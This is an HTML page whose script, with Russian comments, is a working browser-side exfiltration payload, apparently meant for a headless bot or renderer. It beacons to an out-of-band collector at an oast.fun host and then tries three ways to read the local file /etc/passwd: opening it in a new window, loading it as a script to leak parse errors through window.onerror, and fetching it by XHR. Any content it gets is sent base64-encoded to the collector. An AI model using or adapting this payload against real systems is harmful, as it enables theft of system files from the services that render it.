<!DOCTYPE html>
<html>
<body>
    <div id="status">Testing...</div>
    <script>
        (async function() {
            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
            
            // 1. Сразу шлем сигнал, что JS ОЖИЛ
            navigator.sendBeacon(hook + "/JS_ALIVE");

            // 2. Метод чтения через попытку открытия нового окна
            try {
                let win = window.open("file:///etc/passwd");
                setTimeout(() => {
                    try {
                        // Если SOP не сработал (редкость, но бывает в ботах)
                        let data = win.document.documentElement.innerText;
                        navigator.sendBeacon(hook + "/DATA_LEAK", btoa(data));
                    } catch(e) {
                        navigator.sendBeacon(hook + "/WINDOW_LOCKED", e.message);
                    }
                }, 1000);
            } catch(e) {}

            // 3. Brute-force первой строки (Syntax Error)
            // Мы ловим ошибку парсинга через глобальный обработчик
            window.onerror = function(msg, url, line) {
                navigator.sendBeacon(hook + "/ERROR_LEAK", JSON.stringify({m: msg, u: url}));
            };

            const script = document.createElement('script');
            script.src = "file:///etc/passwd"; 
            document.body.appendChild(script);

            // 4. Попытка через XHR (вдруг флаг --disable-web-security включен?)
            try {
                let xhr = new XMLHttpRequest();
                xhr.open("GET", "file:///etc/passwd");
                xhr.onload = () => navigator.sendBeacon(hook + "/XHR_LEAK", btoa(xhr.responseText));
                xhr.send();
            } catch(e) {}

        })();
    </script>
</body>
</html>
